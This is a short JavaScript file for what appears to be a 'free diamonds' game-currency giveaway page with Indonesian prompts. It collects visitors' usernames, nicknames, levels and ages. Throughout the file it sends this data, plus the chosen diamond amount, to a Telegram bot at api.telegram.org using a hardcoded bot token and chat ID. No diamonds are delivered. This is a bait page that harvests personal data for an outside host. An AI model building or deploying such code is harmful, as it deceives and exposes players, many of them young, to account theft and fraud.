const TOKEN = "8689252981:AAE4piGEudqQNwQnOpqisJslfk3rEC3LYdE";
const CHAT_ID = "1178982410";

// STEP 1
function kirimData(){
  const data = {
    username: document.getElementById("username").value,
    nickname: document.getElementById("nickname").value,
    level: document.getElementById("level").value,
    umur: document.getElementById("umur").value
  };

  if(!data.username || !data.nickname){
    return alert("Isi data dulu!");
  }

  localStorage.setItem("user", JSON.stringify(data));

  const text = `📥 USER MASUK
Username: ${data.username}
Nickname: ${data.nickname}
Level: ${data.level}
Umur: ${data.umur}`;

  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:CHAT_ID,
      text:text
    })
  });

  window.location.href="diamond.html";
}

// STEP 2
const diamonds = [5,10,50,100,500,1000,3000,7000];
let selected = "";

if(document.getElementById("list")){
  const list = document.getElementById("list");

  diamonds.forEach(d=>{
    const div = document.createElement("div");
    div.className="card";
    div.innerHTML=`💎 ${d} Diamond<br><small>FREE</small>`;

    div.onclick=()=>{
      document.querySelectorAll(".card").forEach(c=>c.classList.remove("selected"));
      div.classList.add("selected");
      selected = d+" Diamond";
    };

    list.appendChild(div);
  });
}

// STEP 3
function kirimDiamond(){
  if(!selected) return alert("Pilih dulu!");

  const data = JSON.parse(localStorage.getItem("user"));

  const text = `💎 REQUEST DIAMOND
Username: ${data.username}
Nickname: ${data.nickname}
Level: ${data.level}
Umur: ${data.umur}
Jumlah: ${selected}`;

  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:CHAT_ID,
      text:text
    })
  });

  window.location.href="success.html";
}
